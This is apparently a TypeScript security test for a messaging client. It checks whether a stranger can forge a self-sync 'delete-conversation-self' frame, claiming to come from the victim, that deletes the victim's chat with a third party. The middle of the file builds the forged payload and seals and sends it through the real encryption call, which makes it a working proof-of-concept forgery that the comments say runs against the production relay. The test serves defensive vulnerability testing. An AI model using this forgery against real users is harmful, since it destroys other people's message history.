// NETWORKED. Can a stranger DESTROY your conversations by claiming to be you?
//
//   yarn harness dm-selfdelete-forgery
//
// ── The attack ─────────────────────────────────────────────────────────────
//
// `delete-conversation-self` is a self-sync signal: when you delete a DM on one
// device, your OTHER devices delete their copy too. The receive handler is
// gated so a counterparty cannot trigger it — but the gate reads
// `content.senderId`, which is PLAINTEXT the sender wrote, not the sender the
// crypto layer authenticated.
//
// So the question is: can a stranger send a frame that says "senderId: <you>"
// and make your client delete a conversation of their choosing?
//
// The target here is a conversation with a THIRD party, not with the attacker.
// That is the point: if it works, a stranger can destroy history between you
// and someone they have nothing to do with.
//
// ── Why this scenario builds its own envelope ──────────────────────────────
//
// A well-behaved client cannot express this attack: `submitMessage` overwrites
// `content.senderId` with your own address. A real attacker is not running our
// client, so the scenario does what a modified one would — it seals an init
// envelope directly with the same crypto call the real send path uses, and puts
// exactly the bytes it wants inside. Everything after that is the victim's real
// receive path.
//
// ⚠️ Talks to the PRODUCTION relay with throwaway accounts. See identity.ts.
import { test, expect } from 'vitest';
import { channel as secureChannel } from '@quilibrium/quilibrium-js-sdk-channels';
import { createBot } from './bot';
import { makeApiClient } from './transport';

const SETTLE_MS = Number(process.env.HARNESS_SETTLE_MS ?? 15_000);
const STAMP = String(Date.now()).slice(-8);

test(
  'dm-selfdelete-forgery: a stranger must not be able to delete your conversations',
  async () => {
    const [attacker, victim, friend] = await Promise.all([
      createBot('selfdel-attacker-bot'),
      createBot('selfdel-victim-bot'),
      createBot('selfdel-friend-bot'),
    ]);

    try {
      await Promise.all([attacker.start(), victim.start(), friend.start()]);
      await Promise.all([
        attacker.drainInbox(),
        victim.drainInbox(),
        friend.drainInbox(),
      ]);

      // 1. The victim has a real conversation with a friend. This is what the
      //    attacker will try to destroy.
      await friend.send(victim.identity.address, `hi from your friend ${STAMP}`);
      await new Promise((r) => setTimeout(r, SETTLE_MS));
      await victim.send(friend.identity.address, 'good to hear from you');
      await new Promise((r) => setTimeout(r, SETTLE_MS));

      const friendConvId = `${friend.identity.address}/${friend.identity.address}`;
      const before = (await victim.messageDB.getConversation({
        conversationId: friendConvId,
      }))?.conversation;
      const messagesBefore = (
        await victim.messageDB.getMessages({
          spaceId: friend.identity.address,
          channelId: friend.identity.address,
          limit: 200,
        })
      ).messages.length;

      // 2. THE FORGERY. An init envelope from the attacker, whose payload claims
      //    the victim wrote it, naming the FRIEND's conversation as the target.
      const api = makeApiClient();
      const attackerReg = (await api.getUser(attacker.identity.address))?.data as {
        user_address: string;
        device_registrations: { inbox_registration: { inbox_address: string } }[];
      };
      const victimReg = (await api.getUser(victim.identity.address))?.data as {
        device_registrations: { inbox_registration: { inbox_address: string } }[];
      };

      const forged = {
        channelId: victim.identity.address,
        spaceId: victim.identity.address,
        messageId: `selfdel-${STAMP}`,
        digestAlgorithm: 'SHA-256',
        nonce: `selfdel-nonce-${STAMP}`,
        createdDate: Date.now(),
        modifiedDate: Date.now(),
        lastModifiedHash: '',
        content: {
          type: 'delete-conversation-self',
          // ⚠️ THE LIE: the victim's own address, on a frame the attacker sent.
          senderId: victim.identity.address,
          // ⚠️ AND AN ARBITRARY TARGET: a conversation the attacker is not part of.
          conversationAddress: friend.identity.address,
        },
        reactions: [],
      };

      let sealedCount = 0;
      for (const dev of victimReg.device_registrations) {
        const sessions = await secureChannel.NewDoubleRatchetSenderSession(
          attacker.identity.keyset.deviceKeyset,
          attackerReg.user_address,
          dev as never,
          JSON.stringify(forged),
          undefined,
          undefined
        );
        for (const s of sessions as unknown as { sealed_message: object }[]) {
          attacker.transport.send(JSON.stringify({ type: 'direct', ...s.sealed_message }));
          sealedCount += 1;
        }
      }
      await new Promise((r) => setTimeout(r, SETTLE_MS));

      // 3. Did the victim's conversation with the FRIEND survive?
      const after = (await victim.messageDB.getConversation({
        conversationId: friendConvId,
      }))?.conversation;
      const messagesAfter = (
        await victim.messageDB.getMessages({
          spaceId: friend.identity.address,
          channelId: friend.identity.address,
          limit: 200,
        })
      ).messages.length;

      console.log(
        `[selfdel] RESULT sealedFrames=${sealedCount} ` +
          `conversationBefore=${!!before} after=${!!after} ` +
          `messagesBefore=${messagesBefore} after=${messagesAfter}`
      );

      // PRECONDITIONS — a vacuous run must fail loudly.
      expect(sealedCount, 'no forged frame was sent — nothing was tested').toBeGreaterThan(0);
      expect(before, 'victim had no conversation with the friend to destroy').toBeTruthy();
      expect(messagesBefore, 'victim had no messages with the friend').toBeGreaterThan(0);

      // THE SECURITY PROPERTY. A stranger's claim of authorship must carry no
      // authority over the victim's data.
      expect(after, 'a stranger DELETED the victim’s conversation with a third party').toBeTruthy();
      expect(
        messagesAfter,
        'a stranger DESTROYED the victim’s message history with a third party'
      ).toBe(messagesBefore);

      console.log('[selfdel] PASS — forged self-authorship carried no authority');
    } finally {
      attacker.stop();
      victim.stop();
      friend.stop();
    }
  },
  10 * 60 * 1000
);
